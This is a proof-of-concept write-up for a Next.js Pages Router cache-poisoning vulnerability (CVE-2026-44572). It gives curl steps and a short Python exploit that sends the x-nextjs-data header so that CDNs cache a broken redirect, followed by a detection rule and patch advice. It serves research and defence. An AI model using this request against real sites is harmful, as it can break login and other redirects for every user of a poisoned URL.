# Next.js x-nextjs-data Cache Poisoning (CVE-2026-44572)

<!-- 
  File: 2026-05-17_nextjs-x-nextjs-data-cache-poisoning.md
  Location: pocs/web/
-->

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-05-17 |
| **Last Updated** | 2026-05-08 |
| **Author / Researcher** | dwisiswant0 |
| **CVE / Advisory** | CVE-2026-44572 |
| **Category** | web |
| **Severity** | Low |
| **CVSS Score** | 3.1 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N) |
| **Status** | Researched |
| **Tags** | cache-poisoning, x-nextjs-data, redirect, CDN, header-smuggling, Next.js, Pages-Router, unauthenticated |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | Next.js Pages Router (redirect handling via middleware or next.config.js) |
| **Versions Affected** | Next.js <= 16.2.4 |
| **Language / Platform** | JavaScript / Node.js |
| **Authentication Required** | No |
| **Network Access Required** | Yes |

---

## Summary

CVE-2026-44572 is a cache poisoning vulnerability in Next.js Pages Router redirect handling. Pre-patch, any external client could set the internal `x-nextjs-data: 1` header on a request to a redirecting URL, causing the server to return a `200 OK` with `x-nextjs-redirect` instead of the expected `307 Temporary Redirect + Location` response. Browsers render this as a blank page; CDN/proxy caches store and replay the malformed `200` response to all subsequent users of the same URL, effectively breaking redirect-based navigation for the duration of the cache TTL. Rated CVSS 3.1 Low with no known active exploitation.

---

## Vulnerability Details

### Root Cause

In `resolve-routes.ts`, the `isNextDataReq` request-meta flag was set based solely on the inbound `x-nextjs-data` header value, which any external client could set. The lower layers (web/adapter.ts, base-server) consulted this header directly rather than deriving the flag from the resolved pathname. This allowed a client to trigger the "data request" code-path on any URL including redirect-resolving URLs by simply adding the header. The patch (`15341fdf49`) added a `setIsNextDataRequest()` function that is only called when the resolved pathname matches a `_next/data/<buildId>/...` pattern, and added `x-nextjs-data` to the `INTERNAL_HEADERS` list so it is stripped from inbound user requests.

### Attack Vector

Attacker sends a `GET` request to any redirecting URL (configured via `next.config.js` redirects or `NextResponse.redirect()` middleware) with the header `x-nextjs-data: 1`. The vulnerable server returns `200 OK` + `x-nextjs-redirect: <dest>` with no `Location` header instead of the proper `307` redirect. A CDN or proxy that caches the `200` response will serve the malformed entry to subsequent legitimate users.

### Impact

Denial of Service on redirect-based navigation for the poisoned URL. Applications relying on `Location` redirects for authentication (e.g. login redirects) silently fail to redirect. A single attacker request can pollute a CDN cache and break the redirect for all users until cache TTL expires.

---

## Environment / Lab Setup

```
OS:          Linux / macOS / Windows
Target:      Next.js <= 16.2.4 Pages Router with at least one redirect configured
Attacker:    Any host able to send crafted HTTP GET requests
Tools:       python3, bash, curl
```

### Setup Steps

```bash
# Clone source PoC collection
git clone https://github.com/dwisiswant0/next-16.2.4-pocs.git
cd next-16.2.4-pocs/poc/CVE-2026-44572_GHSA-3g8h-86w9-wvmq

# Configure target and redirect path, then run exploit
TARGET=http://localhost:3000 \
REDIRECT_PATH=/redirect-to-somewhere \
EXPECTED_DEST=/somewhere \
python3 exploit.py
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Baseline request** - verify the redirect URL returns a proper 307.
   ```bash
   curl -i http://target/redirect-to-somewhere
   # Expect: HTTP/1.1 307  Location: /somewhere
   ```

2. **Exploit request** - add the x-nextjs-data header.
   ```bash
   curl -i -H 'x-nextjs-data: 1' http://target/redirect-to-somewhere
   # Vulnerable: HTTP/1.1 200  x-nextjs-redirect: /somewhere  (no Location header)
   # Patched:    HTTP/1.1 307  Location: /somewhere
   ```

3. **Cache poisoning** - any CDN that stored the 200 response will serve it to subsequent users.
   ```bash
   # Subsequent request without the header still gets the malformed 200
   curl -i http://target/redirect-to-somewhere
   ```

### Exploit Code

> See `exploit.py` and `exploit.sh` in this folder.

```python
# Minimal inline PoC — full version in exploit.py
import urllib.request, urllib.error

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *_a, **_kw): return None

req = urllib.request.Request(
    "http://target/redirect-to-somewhere",
    headers={"x-nextjs-data": "1"}, method="GET"
)
opener = urllib.request.build_opener(NoRedirect())
try:
    with opener.open(req, timeout=15) as resp:
        print(resp.status, dict(resp.getheaders()))
except urllib.error.HTTPError as e:
    print(e.code, dict(e.headers))
```

### Expected Output

```
x VULNERABLE — server returned 2xx with x-nextjs-redirect and no Location header for a non-data URL.
  CDNs will cache this; browsers render a blank page; real redirect is broken.

>>> RESULT: PASS (vulnerability reproduced) <<<
```

---

## Screenshots / Evidence

- `screenshots/` - add response header captures showing 200 + x-nextjs-redirect vs expected 307 + Location

---

## Detection & Indicators of Compromise

```
# HTTP access log pattern: GET to a redirect URL with x-nextjs-data header
GET /redirect-to-somewhere HTTP/1.1  x-nextjs-data: 1
# Response returns 200 OK instead of 3xx for a known redirect path
```

**SIEM / IDS Rule (example):**
```
alert http any any -> $HTTP_SERVERS any (
  msg:"Possible CVE-2026-44572 x-nextjs-data redirect poisoning attempt";
  content:"x-nextjs-data|3a| 1"; http_header;
  sid:900044572; rev:1;
)
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | Upgrade Next.js to 15.5.16 or 16.2.5+ |
| **Workaround** | Strip the `x-nextjs-data` header at the CDN/WAF before requests reach origin |
| **Config Hardening** | Configure CDN to not cache responses containing `x-nextjs-redirect` header, or treat them as redirect responses requiring revalidation |

---

## References

- [CVE-2026-44572 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-44572)
- [Next.js Advisory - GHSA-3g8h-86w9-wvmq](https://github.com/vercel/next.js/security/advisories/GHSA-3g8h-86w9-wvmq)
- [Next.js Patch Commit 15341fdf49](https://github.com/vercel/next.js/commit/15341fdf49)
- [Source Repository - dwisiswant0/next-16.2.4-pocs](https://github.com/dwisiswant0/next-16.2.4-pocs)

---

## Notes

Auto-ingested from https://github.com/dwisiswant0/next-16.2.4-pocs on 2026-05-17.

No known active exploitation at time of disclosure. This issue is closely related to CVE-2026-44573 (i18n middleware bypass), as both share the same `x-nextjs-data` header trust boundary root cause and were fixed in the same patch cluster (`15341fdf49`). Issue tracked as #50.
